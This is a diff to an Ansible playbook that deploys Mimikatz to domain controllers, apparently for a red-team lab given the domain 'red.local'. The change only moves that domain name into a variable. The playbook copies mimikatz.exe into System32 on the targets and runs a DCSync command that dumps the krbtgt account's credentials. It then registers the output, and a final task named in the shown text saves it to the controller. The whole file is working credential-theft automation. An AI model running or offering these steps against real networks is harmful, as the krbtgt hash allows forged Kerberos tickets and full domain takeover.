@@ -2,6 +2,8 @@
 - name: Execute Mimikatz via Ansible
   hosts: domain-controllers
   gather_facts: yes
+  vars:
+    domain: red.local
   tasks:
     - name: Copy mimikatz.exe to target
       win_copy:
@@ -9,7 +11,7 @@
         dest: C:\Windows\System32\mimikatz.exe
 
     - name: Run DCSync command
-      win_shell: C:\Windows\System32\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:red.local /user:krbtgt" "exit"
+      win_shell: C:\Windows\System32\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:{{ domain }} /user:krbtgt" "exit"
       register: dcsync_output
 
     - name: Save output to a local file on the Ansible controller
